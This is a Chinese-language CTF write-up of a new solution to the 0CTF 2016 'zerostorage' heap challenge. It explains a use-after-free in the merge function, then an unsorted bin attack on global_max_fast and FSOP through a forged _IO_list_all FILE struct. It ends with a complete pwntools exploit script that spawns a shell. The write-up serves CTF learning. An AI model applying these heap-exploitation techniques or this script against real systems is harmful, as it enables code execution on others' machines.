> 原文链接: https://www.anquanke.com//post/id/178418 


# 新解0CTF2016 zerostorage


                                阅读量   
                                **243342**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01a2b02804a2dadcee.png)](https://p3.ssl.qhimg.com/t01a2b02804a2dadcee.png)



## 前言

这题是在做[`global_max_fast`](https://ray-cp.github.io/archivers/heap_global_max_fast_exploit)相关利用总结的时候做的，解法仍然使用了隐藏的uaf以及`unsorted bin attack`。

为什么说是新解，指的是在改写`global_max_fast`后续的利用的过程与已有的解法存在一定的区别。现有的解法是基于老版本的linux内核，在泄露出libc的基址以及堆地址后，通过偏移计算得到程序的基址，然后在bss段上构造堆块实现利用。

目前的随机化程度已不支持这个方法，之前的方法已经无法成功利用，在经过分析之后，得到了新的解法，新解是基于只有libc地址以及堆地址对该题实现漏洞利用的方法。

下面详细描述过程。



## 题目描述

一道经典的菜单题，是一个管理`entry`的堆题，程序提供了七个选项，分别是：

```
1. Insert
2. Update
3. Merge
4. Delete
5. View
6. List
7. Exit
```

程序使用了一个全局数组来存储`entry`的管理结构体，每个`entry`管理结构题定义如下：

```
struct entry_struct
`{`
    int64 flag;                
    int64 size;
    char *protect_ptr;
`}`
```

其中`flag`表示该entry是否有效，`size`表示entry大小，`protect_ptr`是申请出来的堆块与一个随机数的异或值以保护指针。

`insert`函数的作用是申请堆块，堆块的大小必须为0x80到0x1000之间，但是如果输入的size小于0x80的话，申请出来的堆块位0x80大小，但是最终结构体中的size为输入的大小。

`update`函数的作用是更新entry，更新所输入的size大小也需为0x80到0x1000之间，如果update的size与之前的size不一致的话会调用`realloc`重新分配堆块。

`merge`函数的作用是合并entry，给定一个`from id`以及一个`to id`，将`from id`的内容使用`realloc`函数合并至`to id`中并形成一个新的entry，同时将`from id`以及`to id`所对应的entry给删掉。

`delete`函数的作用是删除entry，给定一个`id`将其entry所对应的堆块释放掉，同时将`flag`置0。

`view`函数的作用是输出entry内容，给定义个有效`id`，打印处该entry中的内容。

`list`以及`exit`没怎么用到，也没啥用。



## 漏洞信息

题目的漏洞在`merge`函数中，漏洞的成因在`from id`以及`to id`没有进行检查，可以为同一个，导致出现了意外情况。

如果`from id`以及`to id`为同一个的话（即`from id`以及`to id`entry所对应的堆块为同一块），且他们的size相加如果不超过0x80（wp中我的是等于0x80），程序在`merge`时不会触发realloc去分配新的堆块，仍然使用`to id`对应的堆块直接作为新的entry，但是后续却将`from id`对应的堆块`free`掉，此时就形成了uaf漏洞，我们可以使用`merge`后形成的新的id来操作该被free的堆块。



## 漏洞利用

就是这么一个uaf，如何利用呢？

首先第一步，自然想的是如何信息泄露，很多时候只有泄露了地址才能够进行后续的利用。利用这个`merge`函数中的uaf，可以很容易就泄露出libc地址和heap地址。因为申请的是smallbin大小的堆块，释放后都会被放进unsorted bin里面形成双链表。想要泄露出libc地址和heap地址，只需要先利用`uaf`将堆块A释放到unsorted里面，再释放一个堆块B到unsoted bin里面，此时利用view A块所对应的entry就可以得到B的地址以及main arena的地址。

泄露地址后，要解决的事该如何实现后续利用。已经知道堆块是被释放进unsorted bin中且可以修改，因此可以实施`unsorted bin attack`，`unsorted bin attack`可以向任意地址写main arena的地址，去修改`global_max_fast`是一个不错的选择，将该变量修改后，我们就可以把堆块当成fastbin来使用，绕过了它不能分配fastbin的限制。

在修改完成后`global_max_fast`如何进一步得到shell。原有的wp的解法是：在老版本的linux内核中，可以在泄露出libc的基地址后，通过偏移得到程序的基地址。在得到程序的基地址后可以在bss段上伪造一个堆块，同时利用uaf修改释放后的fd，使其指向bss段中的堆块，最后申请将堆块申请出来，泄露出地址并计算出用于异或的随机值，实现修改entry指针的达到任意写的目的，最终getshell。

但是在现有的版本中，无法通过libc地址得到程序的基址，该如何进一步利用拿到shell？接下来就是标题中**新解**所包含的部分了：据之前写的文章`堆中global_max_fast相关利用`，我们可以将目标瞄准为将`global_max_fast`改写后，复写`_IO_list_all`指针用io file来进行攻击。

但是`_IO_list_all`指针地址到`main_arena`中`fastbin`数组的地址的距离转换成对应的堆的size达到了`0x1410`，题目中限制了堆申请的大小只能为`0x80`到`0x1000`，所以似乎无法控制`0x1410`大小的堆块。

在把程序再次审查以后，发现解决方法还是在`merge`函数中，`merge`函数把两个entry合并，但是并没有对合并后的堆块的大小进行检查，使得其可以超过`0x1000`，最终达到任意堆块大小申请的目的。

这样问题就简单了，`merge`出相应大小的堆块并将其内容填写成伪造的io file结构体，free该堆块至`_IO_list_all`指针中，最终触发FSOP来get shell。



## 漏洞利用exp

完整exp如下：

```
from pwn_debug.pwn_debug import *

pdbg=pwn_debug("zerostorage")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local()
pdbg.debug("2.23")
pdbg.remote('34.92.37.22', 10002)
#p=pdbg.run("local")
#p=pdbg.run("debug")
p=pdbg.run("debug")
membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

def insert(size,data):
    p.recvuntil("choice: ")
    p.sendline("1")
    p.recvuntil("entry: ")
    p.sendline(str(size))
    p.recvuntil("data: ")
    p.send(data)

def update(idx,size,data):
    p.recvuntil("choice: ")
    p.sendline("2")
    p.recvuntil("ID: ")
    p.sendline(str(idx))
    p.recvuntil("entry: ")
    p.sendline(str(size))
    p.recvuntil("data: ")
    p.send(data)

def merge(from_idx,to_idx):
    p.recvuntil("choice: ")
    p.sendline("3")
    p.recvuntil("ID: ")
    p.sendline(str(from_idx))
    p.recvuntil("ID: ")
    p.sendline(str(to_idx))

def delete(idx):
    p.recvuntil("choice: ")
    p.sendline("4")
    p.recvuntil("ID: ")
    p.sendline(str(idx))
def view(idx,):
    p.recvuntil("choice: ")
    p.sendline("5")
    p.recvuntil("ID: ")
    p.sendline(str(idx))


def list():
    p.recvuntil("choice: ")
    p.sendline("6")

def build_fake_file(addr,vtable):

    flag=0xfbad2887
    #flag&amp;=~4
    #flag|=0x800
    fake_file=p64(flag)               #_flags
    fake_file+=p64(addr)             #_IO_read_ptr
    fake_file+=p64(addr)             #_IO_read_end
    fake_file+=p64(addr)             #_IO_read_base
    fake_file+=p64(addr)             #_IO_write_base
    fake_file+=p64(addr+1)             #_IO_write_ptr
    fake_file+=p64(addr)         #_IO_write_end
    fake_file+=p64(addr)                    #_IO_buf_base
    fake_file+=p64(0)                    #_IO_buf_end
    fake_file+=p64(0)                       #_IO_save_base
    fake_file+=p64(0)                       #_IO_backup_base
    fake_file+=p64(0)                       #_IO_save_end
    fake_file+=p64(0)                       #_markers
    fake_file+=p64(0)                       #chain   could be a anathor file struct
    fake_file+=p32(1)                       #_fileno
    fake_file+=p32(0)                       #_flags2
    fake_file+=p64(0xffffffffffffffff)      #_old_offset
    fake_file+=p16(0)                       #_cur_column
    fake_file+=p8(0)                        #_vtable_offset
    fake_file+=p8(0x10)                      #_shortbuf
    fake_file+=p32(0)
    fake_file+=p64(0)                    #_lock
    fake_file+=p64(0xffffffffffffffff)      #_offset
    fake_file+=p64(0)                       #_codecvt
    fake_file+=p64(0)                    #_wide_data
    fake_file+=p64(0)                       #_freeres_list
    fake_file+=p64(0)                       #_freeres_buf
    fake_file+=p64(0)                       #__pad5
    fake_file+=p32(0xffffffff)              #_mode
    fake_file+=p32(0)                       #unused2
    fake_file+=p64(0)*2                     #unused2
    fake_file+=p64(vtable)                       #vtable

    return fake_file


def pwn():

    #pdbg.bp([0x13ea,0x148a])
    insert(0x40,'a'*0x40) #0
    insert(0x40,'b'*0x40) #1
    insert(0x40,'c'*0x40) #2
    insert(0x40,'d'*0x40) #3
    insert(0x40,'e'*0x40) #4 
    insert(0x1000-0x10,'f'*(0x1000-0x10)) #5
    insert(0x400,'f'*0x400) #6
    insert(0x400,'f'*0x400) #7
    insert(0x40, 'f'*0x40) #8
    insert(0x60,'f'*0x60) #9
    #merge(0,0)
    #pdbg.bp([0x13ea])
    delete(6)
    merge(7,5) #6
    #pdbg.bp()

    insert(0x400,'a'*0x400) #5
    merge(0,0) # 7
    merge(2,2) # 0


    ## step 1 leak libc address and heap address
    #pdbg.bp([0x120c,0x1052])
    view(7)
    p.recvuntil(":n")

    unsorted_addr=u64(p.recv(8))
    libc_base=unsorted_addr-libc.symbols['main_arena']-88
    heap_base=u64(p.recv(8))-0x120
    #pdbg.bp([0x120c,0x123f,0x1052])
    log.info("leak libc base: %s"%hex(libc_base))
    log.info("leak heap base: %s"%hex(heap_base))
    global_max_fast=libc_base+libc.symbols['global_max_fast']
    io_stderr=libc_base+libc.symbols['_IO_2_1_stderr_']
    rce=libc_base+0xd5c07  
    #pdbg.bp([0x1216,0x13ea]) 
    heap_addr=heap_base+0x1b90
    fake_file=build_fake_file(io_stderr,heap_addr)
    ## step 2 build a fake file
    update(6,0x1000-0x10,fake_file[0x10:].ljust(0x1000-0x10,'f'))
    ## step 3 form a 0x1410 big chunk with merge funcion
    merge(5,6)

    ## step 4 unsorted bin attack to overwrite global_max_fast
    update(7,0x10,p64(unsorted_addr)+p64(global_max_fast-0x10))
    insert(0x40,'a'*0x40) 
    #pdbg.bp([0x123f,0x15ce])
    update(9,0x60,p64(0)*2+p64(rce)*(0x50/8))
    #pdbg.bp(0x15ce)

    ## step 5 overwrite _IO_list_all 
    delete(2)

    ## step 6 trigger io flush to get shell
    p.recvuntil(":")
    p.sendline('1')
    p.recvuntil(":")
    p.sendline("100")
    p.interactive() #get the shell

if __name__ == '__main__':
   pwn()
```



## 小结

不禁感叹：神奇的堆以及io大法好。相关文件和脚本在我的[github](https://github.com/ray-cp/ctf-pwn/tree/master/PWN_CATEGORY/heap/global_max_fast/0ctf2016-zerostorage)



## 参考链接
1. [0CTF 2016 – Zerostorage Writeup](http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/)